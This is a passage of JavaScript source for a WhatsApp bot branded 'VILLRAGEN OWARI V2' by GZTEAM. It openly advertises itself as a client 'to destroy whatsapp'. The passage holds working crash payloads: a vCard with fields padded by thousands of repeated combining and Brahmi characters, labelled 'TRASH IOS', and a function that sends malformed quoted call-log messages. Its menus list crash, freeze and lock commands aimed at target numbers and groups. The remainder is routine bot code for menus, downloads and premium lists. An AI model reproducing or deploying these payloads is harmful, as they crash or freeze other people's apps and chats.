    "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nORG:🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nTITLE:🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🚮⃟̊༚̥Ꮂ 𝐕𝐈𝐋𝐋 - 𝐓𝐑𝐀𝐒𝐇 𝐈𝐎𝐒 Ꮂ ⋆>${"ᩫᩫ".repeat(4000)}\nEND:VCARD`
  }
}, {})
await sleep(1500)
}
}
        async function nulljid(target) {
        await gzteam.relayMessage(target, {
                        extendedTextMessage:{
                            text:"😹🤙 - gzteam? is die !@5521992999999",
                            contextInfo: {
                                mentionedJid: [
                                "5521992999999@s.whatsapp.net"
                                ],
                                stanzaId: "1234567890ABCDEF",
                                participant: "5521992999999@s.whatsapp.net",
                                quotedMessge: {
                                    callLogMessage: {
                                        isVideo: true,
                                        callOutcome: "1",
                                        durationSecs: "0",
                                        callType: "REGULAR",
                                        participants: [{
                                            jid: "5521992999999@s.whatsapp.net",
                                            callOutcome: "1"
                                        }]
                                    }
                                }
                            }
                        }
                    }, { participant: { jid: target }})
        
        }
        
        
        
        //END OF FUNCTION BUG




async function CatBox(filePath) {
	try {
		const fileStream = fs.createReadStream(filePath);
		const formData = new BodyForm();
		formData.append('fileToUpload', fileStream);
		formData.append('reqtype', 'fileupload');
		formData.append('userhash', '');
		const response = await axios.post('https://catbox.moe/user/api.php', formData, {
			headers: {
				...formData.getHeaders(),
			},
		});
		return response.data;
	} catch (error) {
		console.error("Error at Catbox uploader:", error);
		return "Terjadi kesalahan saat upload ke Catbox.";
	}
};

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "../command"));
        const plug = { gzteam, prefix, command, reply, text, Access, reaction, isGroup: m.isGroup, isPrivate: !m.isGroup, pushname, mime, quoted, sleep, fetchJson };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.owner && !Access) {
                    return reply(mess.owner);
                }
                
                if (plugin.group && !plug.isGroup) {
                    return m.reply(mess.group);
                }
                
                if (plugin.private && !plug.isPrivate) {
                    return m.reply(mess.private);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
        
        const pushtak = {
			key: {
				remoteJid: '0@s.whatsapp.net',
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				contactMessage: {
					displayName: (pushname),
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
				}
			}
		};
        
        if (!pluginsDisable) return;  

        switch (command) {
        
        case "menu": {
        let menu = "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗢𝗪𝗔𝗥𝗜 𝗩𝟮 `[ 𝗔𝗧𝗢𝗠𝗜𝗖 | ɢᴢ ᴀʟᴡᴀʏs ]`\n𝘞𝘦𝘭𝘤𝘰𝘮𝘦 𝘵𝘰 𝘖𝘸𝘢𝘳𝘪, 私はWhatsAppを通じてのみ何かを検索したりデータ/情報を取得したりするのに役立つ自動システム（WhatsAppボット）です \n\n▢ ɴᴀᴍᴇ : " + pushname + "\n▢ ᴠᴇʀsɪᴏɴ : 𝟸.𝟶\n▢ ᴘʀᴇғɪx : [ " + prefix + " ]\n\n> ©𝘎𝘡𝘛𝘌𝘈𝘔 𝘈𝘓𝘞𝘈𝘠𝘚"
gzteam.sendMessage(m.chat, {
  footer: "sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ᴛᴏ ᴅᴇsᴛʀᴏʏ ᴡʜᴀᴛsᴀᴘᴘ",
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'Ꮂ All Menu Ꮂ' },
      type: 1
    },
    {
    buttonId: `.credits`,
      buttonText: { displayText: 'Ꮂ Credits Ꮂ' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'List Menu' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'List Menu',
          sections: [
            {
              title: 'Main Menu | VILL OWARI V2 | GZ',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  description: 'See All Menu Commands', 
                  id: '.allmenu'
                },                
                {
                  title: 'BUG MENU',
                  description: 'Lets destroy whatsapp using bug', 
                  id: '.bugmenu'
                },                
                {
                  title: 'CREDIT MENU',
                  description: 'Creator of script created', 
                  id: '.credits'
                  },                
                {
                  title: 'OWNER MENU',
                  description: 'See Owner Menu Commands', 
                  id: '.ownermenu'
                },                
                {
                  title: 'DOWNLOAD MENU',
                  description: 'You can download a media like tiktok/youtube', 
                  id: '.downloadmenu'
                },                
                {
                  title: 'VOICE MENU',
                  description: 'See Voice Changer Commands',
                  id: '.voicemenu'
                }, 
                {
                  title: 'CONVERT MENU',
                  description: 'See Converter Commands',
                  id: '.convertmenu'
                }, 
                {
                  title: 'Ping Bot ( Check Online )', 
                  id: '.ping'
                  }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
       image: cihuy,
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "—GZTEAM NEVER SETTLE",
      newsletterJid: `120363294762472395@newsletter`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗩𝟮",
        body: "𝘉𝘺 𝘌𝘭𝘢𝘯𝘨𝘎𝘢𝘯𝘻𝘻 𝘹 𝘝𝘪𝘭𝘭𝘏𝘢𝘻𝘦",
        thumbnailUrl: 'https://files.catbox.moe/wpjpoe.jpg',
        sourceUrl: 'gzteam.com',
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
    }, {
                        quoted: pushtak
                    });
/*gzteam.sendMessage(
  m.chat, // ID penerima (nomor telepon atau ID grup)
  {
    image: cihuy, 
    caption: "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗢𝗪𝗔𝗥𝗜 𝗩𝟮 `[ 𝗔𝗧𝗢𝗠𝗜𝗖 | ɢᴢ ᴀʟᴡᴀʏs ]`\n𝘞𝘦𝘭𝘤𝘰𝘮𝘦 𝘵𝘰 𝘖𝘸𝘢𝘳𝘪, 私はWhatsAppを通じてのみ何かを検索したりデータ/情報を取得したりするのに役立つ自動システム（WhatsAppボット）です \n\n`[ 𝘈𝘓𝘓 𝘔𝘌𝘕𝘜 ] -> Main Menu` \n[⭐] ғᴏʀ sᴇᴇ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs\n`[ 𝘉𝘜𝘎 𝘔𝘌𝘕𝘜 ] -> Bug Menu` \n[⚡] ғᴏʀ sᴇᴇ ʙᴜɢ ᴍᴇɴᴜ\n\nᴄʀᴇᴅɪᴛ sᴄʀɪᴘᴛs\n- ElangGanzz `[ DEV ]`\n- VillExec `[ OWNER ]`\n- Devorsixcore `[ Friends ]`",
    footer: 'sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ғᴏʀ ᴄʀᴀsʜɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ',
    buttons: [
      {
        buttonId: '.allmenu',
        buttonText: {
          displayText: "ALL Menu", 
        },
        type: 1,
      },
      {
        buttonId: '.bugmenu',
        buttonText: {
          displayText: "BUG Menu",
        },
        type: 1,
      },
    ],
    headerType: 1,
    viewOnce: true,
  },
  { quoted: pushtak }
);*/
}
break

case "bugmenu": {
gzteam.sendMessage(
  m.chat, // ID penerima (nomor telepon atau ID grup)
  {
    image: kucing, 
    caption: "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗢𝗪𝗔𝗥𝗜 𝗩𝟮 `[ 𝗔𝗧𝗢𝗠𝗜𝗖 | ɢᴢ ᴀʟᴡᴀʏs ]`\n\n`[⭐] 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 [⚡]`\n\n> Use .bug 62xxxx for fast\n▢ protocolbug number\n▢ freezechat inplace\n▢ lockgroup inplace\n▢ crashgroup inplace\n▢ fresh inplace `[CLEAR BUG]`\n▢ null number & delnull number for trash bug\n▢ lockios number or xios number\n`[‼️] 𝙊𝙒𝙉𝙀𝙍 𝙈𝙀𝙉𝙐 [🛐]`\n▢ addprem number/tag\n▢ dellprem number/tag\n\nᴄʀᴇᴅɪᴛ ʙᴜɢ\n- ElangGanzz `[ DEV ]`\n- VillExec `[ OWNER ]`\n- Devorsixcore `[ Friends ]`",// Teks utama pesan
    footer: 'sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ғᴏʀ ᴄʀᴀsʜɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ', // Footer yang ditampilkan di bawah pesan
    buttons: [
      {
        buttonId: '.menu', // ID unik untuk tombol
        buttonText: {
          displayText: "<-- Back", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
      {
        buttonId: '.allmenu', // ID unik untuk tombol
        buttonText: {
          displayText: "All Menu ->", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
    ],
    headerType: 1, // Tipe header (1 untuk teks biasa)
    viewOnce: true, // Pesan hanya bisa dilihat sekali (opsional)
  },
  { quoted: pushtak } // Pesan yang mengutip pesan sebelumnya (opsional)
);
}
break

case "credits": {
gzteam.sendMessage(
  m.chat, // ID penerima (nomor telepon atau ID grup)
  {
    image: { url: 'https://files.catbox.moe/wpjpoe.jpg' }, 
    caption: "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗢𝗪𝗔𝗥𝗜 𝗩𝟮 `[ 𝗔𝗧𝗢𝗠𝗜𝗖 | ɢᴢ ᴀʟᴡᴀʏs ]`\n\nᴄʀᴇᴅɪᴛ sᴄʀɪᴘᴛs\n- ElangGanzz `[ DEV ]`\n- VillExec `[ OWNER ]`\n- Devorsixcore `[ Friends ]`\n- KyuuRzy `[ Plugins/Base ]`\n- GZTEAM `[ IDK ]`",// Teks utama pesan
    footer: 'sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ғᴏʀ ᴄʀᴀsʜɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ', // Footer yang ditampilkan di bawah pesan
    buttons: [
      {
        buttonId: '.menu', // ID unik untuk tombol
        buttonText: {
          displayText: "<-- Back", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
      {
        buttonId: '.allmenu', // ID unik untuk tombol
        buttonText: {
          displayText: "All Menu ->", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
    ],
    headerType: 1, // Tipe header (1 untuk teks biasa)
    viewOnce: true, // Pesan hanya bisa dilihat sekali (opsional)
  },
  { quoted: pushtak } // Pesan yang mengutip pesan sebelumnya (opsional)
);
}
break

case "ownermenu": {
if (!Access) {
return reply("You are not owner, Go Home and cry ! (lol)");
}
gzteam.sendMessage(
  m.chat, // ID penerima (nomor telepon atau ID grup)
  {
    image: { url: 'https://files.catbox.moe/wpjpoe.jpg' }, 
    caption: "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗢𝗪𝗔𝗥𝗜 𝗩𝟮 `[ 𝗔𝗧𝗢𝗠𝗜𝗖 | ɢᴢ ᴀʟᴡᴀʏs ]`\n\n> Owner Menu\n▢ownermenu\n▢ public\n▢ self \n▢ freezechat\n▢ eval\n▢ get\n▢ upsw\n▢ csesi\n▢ eval\n▢ delsampah\n▢ listsampah\n▢ eval msg using (*)\n▢ none\n▢ null",// Teks utama pesan
    footer: 'sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ғᴏʀ ᴄʀᴀsʜɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ', // Footer yang ditampilkan di bawah pesan
    buttons: [
      {
        buttonId: '.menu', // ID unik untuk tombol
        buttonText: {
          displayText: "<-- Back", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
      {
        buttonId: '.allmenu', // ID unik untuk tombol
        buttonText: {
          displayText: "All Menu ->", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
    ],
    headerType: 1, // Tipe header (1 untuk teks biasa)
    viewOnce: true, // Pesan hanya bisa dilihat sekali (opsional)
  },
  { quoted: pushtak } // Pesan yang mengutip pesan sebelumnya (opsional)
);
}
break

case "downloadmenu": {
gzteam.sendMessage(
  m.chat, // ID penerima (nomor telepon atau ID grup)
  {
    image: { url: 'https://files.catbox.moe/wpjpoe.jpg' }, 
    caption: "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗢𝗪𝗔𝗥𝗜 𝗩𝟮 `[ 𝗔𝗧𝗢𝗠𝗜𝗖 | ɢᴢ ᴀʟᴡᴀʏs ]`\n\n" + `> Downloader Menu
 × ${prefix}tiktok
 × ${prefix}igdl
 × ${prefix}play`, 
    footer: 'sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ғᴏʀ ᴄʀᴀsʜɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ', // Footer yang ditampilkan di bawah pesan
    buttons: [
      {
        buttonId: '.menu', // ID unik untuk tombol
        buttonText: {
          displayText: "<-- Back", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
      {
        buttonId: '.allmenu', // ID unik untuk tombol
        buttonText: {
          displayText: "All Menu ->", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
    ],
    headerType: 1, // Tipe header (1 untuk teks biasa)
    viewOnce: true, // Pesan hanya bisa dilihat sekali (opsional)
  },
  { quoted: pushtak } // Pesan yang mengutip pesan sebelumnya (opsional)
);
}
break

case "voicemenu": {
gzteam.sendMessage(
  m.chat, // ID penerima (nomor telepon atau ID grup)
  {
    image: { url: 'https://files.catbox.moe/wpjpoe.jpg' }, 
    caption: "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗢𝗪𝗔𝗥𝗜 𝗩𝟮 `[ 𝗔𝗧𝗢𝗠𝗜𝗖 | ɢᴢ ᴀʟᴡᴀʏs ]`\n\n" + `> Voice Menu
 × ${prefix}fast
 × ${prefix}tupai
 × ${prefix}blown
 × ${prefix}bass
 × ${prefix}smooth
 × ${prefix}deep
 × ${prefix}earrape 
 × ${prefix}nightcore
 × ${prefix}fat
 × ${prefix}robot
 × ${prefix}slow
 × ${prefix}reverse`, 
    footer: 'sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ғᴏʀ ᴄʀᴀsʜɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ', // Footer yang ditampilkan di bawah pesan
    buttons: [
      {
        buttonId: '.menu', // ID unik untuk tombol
        buttonText: {
          displayText: "<-- Back", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
      {
        buttonId: '.allmenu', // ID unik untuk tombol
        buttonText: {
          displayText: "All Menu ->", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
    ],
    headerType: 1, // Tipe header (1 untuk teks biasa)
    viewOnce: true, // Pesan hanya bisa dilihat sekali (opsional)
  },
  { quoted: pushtak } // Pesan yang mengutip pesan sebelumnya (opsional)
);
}
break

case "convertmenu": {
gzteam.sendMessage(
  m.chat, // ID penerima (nomor telepon atau ID grup)
  {
    image: { url: 'https://files.catbox.moe/wpjpoe.jpg' }, 
    caption: "𝗩𝗜𝗟𝗟𝗥𝗔𝗚𝗘𝗡 𝗢𝗪𝗔𝗥𝗜 𝗩𝟮 `[ 𝗔𝗧𝗢𝗠𝗜𝗖 | ɢᴢ ᴀʟᴡᴀʏs ]`\n\n" + `> Converter Menu
× All in One Using .convert (reply-media)
× All in One Using .action (send-msg) or (reply-media)
× ${prefix}s (Image to Sticker Converter with Send/Reply)
× ${prefix}sticker (Sticker Converter with Send/Reply)
× ${prefix}remini (Enhance Media with Send/Reply)
× ${prefix}tourl (Convert to LINK/URL with Send/Reply)
× ${prefix}toimg (Sticker Converter to image with Send/Reply)`, 
    footer: 'sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ғᴏʀ ᴄʀᴀsʜɪɴɢ ᴡʜᴀᴛsᴀᴘᴘ', // Footer yang ditampilkan di bawah pesan
    buttons: [
      {
        buttonId: '.menu', // ID unik untuk tombol
        buttonText: {
          displayText: "<-- Back", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
      {
        buttonId: '.allmenu', // ID unik untuk tombol
        buttonText: {
          displayText: "All Menu ->", // Teks yang ditampilkan di tombol
        },
        type: 1, // Tipe tombol (1 untuk tombol teks)
      },
    ],
    headerType: 1, // Tipe header (1 untuk teks biasa)
    viewOnce: true, // Pesan hanya bisa dilihat sekali (opsional)
  },
  { quoted: pushtak } // Pesan yang mengutip pesan sebelumnya (opsional)
);
}
break
            
            case "allmenu": {
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let mbut = `hi ${pushname}, 私はWhatsAppを通じてのみ何かを検索したりデータ/情報を取得したりするのに役立つ自動システム（WhatsAppボット）です 

sɪᴍᴘʟᴇ ᴄʟɪᴇɴᴛ ᴛᴏ ᴅᴇsᴛʀᴏʏ ᴡʜᴀᴛsᴀᴘᴘ
information:
 × 𝙾𝚆𝙰𝚁𝙸 𝚅2 (𝚅𝙸𝙻𝙻𝚁𝙰𝙶𝙴𝙽)
 × version : 2.0
 × author : VillMods & ElangGanzz
 × status: ${gzteam.public ? 'public' : 'self'}
 × username: @${m.sender.split('@')[0]} 
 × RAM: ${formattedUsedMem} / ${formattedTotalMem}

commands:
> downloader
 × ${prefix}tiktok
 × ${prefix}igdl
 × ${prefix}play

> maker 
 × ${prefix}remini
 × ${prefix}wm
 × ${prefix}brat
 × ${prefix}bratvid
 × ${prefix}qc
 × ${prefix}tourl
 × ${prefix}toimg
 × ${prefix}s
 × ${prefix}convert (reply/send media)

> group
 × ${prefix}tagall
 × ${prefix}hidetag
 
> bugmenu
 × ${prefix}xios / lockios
 × ${prefix}delay / superdelay
 × ${prefix}lockgroup / crashgroup (inplace)
 × ${prefix}freezechat (inplace)
 × ${prefix}protocolbug / 2
 • ${prefix}fresh inplace for trash/clean bugs

> voice
 × ${prefix}fast
 × ${prefix}tupai
 × ${prefix}blown
 × ${prefix}bass
 × ${prefix}smooth
 × ${prefix}deep
 × ${prefix}earrape 
 × ${prefix}nightcore
 × ${prefix}fat
 × ${prefix}robot
 × ${prefix}slow
 × ${prefix}reverse
 
> Artificial intelligence
 × ${prefix}jeslyn
 × ${prefix}bocchi

> owner
 × ${prefix}csesi
 × ${prefix}upsw
 × ${prefix}public
 × ${prefix}self
 × ${prefix}get
 × ${prefix}reactch
 × ${prefix}delsampah
 × ${prefix}listsampah
 × ${prefix}eval

.ping For Check Bot Online or Bad Session
> Author | Credits
- ElangGanzz ( Dev )
- Devorsixcore ( Friend )
- VillMods ( Kamoeflase )
- VillExec ( Owner )`
 
                gzteam.sendMessage(m.chat, {
                    document: fs.readFileSync("./package.json"),
                    fileName: "ElangGanzz - GZ",
                    mimetype: "application/pdf",
                    fileLength: 99999,
                    pageCount: 666,
                    caption: mbut,
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        mentionedJid: [sender],
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "¿? ElangGanzz",
                            newsletterJid: `120363294762472395@newsletter`,
                        },
                        externalAdReply: {  
                            title: "¿? ^VillMods^ - 𝘖𝘞𝘈𝘙𝘐 𝘝2", 
                            body: "This script was created by ElangGanzz",
                            thumbnail: cihuy,
                            sourceUrl: "https://www.youtube.com/altoweros", 
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: pushtak })
            }
            break
            
            case "dellprem": {
if (!Access) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = listpremium.indexOf(ya)
listpremium.splice(unp, 1)
fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(listpremium))
reply(`Number ${ya} Have been removed from database !!!`);
}
break

case "ping": {
reply(" GZ Haikklkk... \n`Bot Is Online no Bad Session`");
}
break

case "addprem": {
if (!Access) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await gzteam.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp !!!`)
listpremium.push(bnnd)
fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(listpremium))
reply(`Number ${bnnd} Have been add from database premium !!!`);
}
break
                
            case "get":{
                if (!Access) return reply(mess.owner)
                if (!/^https?:\/\//.test(text)) return reply(`\n*ex:* ${prefix + command} https://kyuurzy.site\n`);
                const ajg = await fetch(text);
                await reaction(m.chat, "⚡")
                
                if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
                    throw `Content-Length: ${ajg.headers.get("content-length")}`;
                }

                const contentType = ajg.headers.get("content-type");
                if (contentType.startsWith("image/")) {
                    return gzteam.sendMessage(m.chat, {
                        image: { url: text }
                    }, { quoted: m });
                }
        
